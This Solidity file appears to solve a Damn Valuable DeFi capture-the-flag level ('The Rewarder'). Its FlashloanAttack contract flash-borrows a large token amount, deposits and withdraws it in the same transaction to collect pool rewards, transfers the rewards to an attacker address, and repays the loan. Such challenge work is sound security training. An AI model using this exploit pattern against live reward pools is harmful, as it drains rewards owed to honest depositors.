pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract FlashloanAttack {
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashloan;
    DamnValuableToken dvt;
    address attacker;

    constructor(address _attacker, address theRewarderPool, address _flashloan, address _dvt) {
        attacker = _attacker;
        rewarderPool = TheRewarderPool(theRewarderPool);
        flashloan = FlashLoanerPool(_flashloan);
        dvt = DamnValuableToken(_dvt);
    }

    function attack() external {
        flashloan.flashLoan(1_000_000e18);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(1_000_000e18);
        rewarderPool.withdraw(1_000_000e18);
        rewarderPool.rewardToken().transfer(attacker, rewarderPool.rewardToken().balanceOf(address(this)));
        dvt.transfer(address(flashloan), amount);
    }
}
